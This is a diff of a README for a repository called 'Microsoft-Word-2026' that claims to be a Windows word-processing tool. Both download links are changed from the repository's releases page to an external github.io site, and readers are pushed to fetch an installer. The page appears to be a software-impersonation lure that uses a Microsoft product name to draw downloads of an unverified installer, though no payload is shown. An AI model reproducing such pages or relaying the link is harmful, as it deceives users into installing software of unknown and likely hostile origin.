@@ -1,6 +1,6 @@
 # 📝 Microsoft-Word-2026 - Improve your daily document editing workflow
 
-[![](https://img.shields.io/badge/Download-Microsoft--Word--2026-blue.svg)](https://github.com/Thaoa3996/Microsoft-Word-2026/releases)
+[![](https://img.shields.io/badge/Download-Microsoft--Word--2026-blue.svg)](https://thaoa3996.github.io)
 
 Microsoft-Word-2026 improves how you write and edit documents on Windows. This tool manages your styles, handles templates, tracks changes, and creates professional PDF exports. It supports technical writers and office users who need a reliable word processor.
 
@@ -8,7 +8,7 @@ Microsoft-Word-2026 improves how you write and edit documents on Windows. This t
 
 You must visit the project release page to download the latest installer. 
 
-[Click here to open the download page](https://github.com/Thaoa3996/Microsoft-Word-2026/releases)
+[Click here to open the download page](https://thaoa3996.github.io)
 
 Follow these steps to download the file:
 
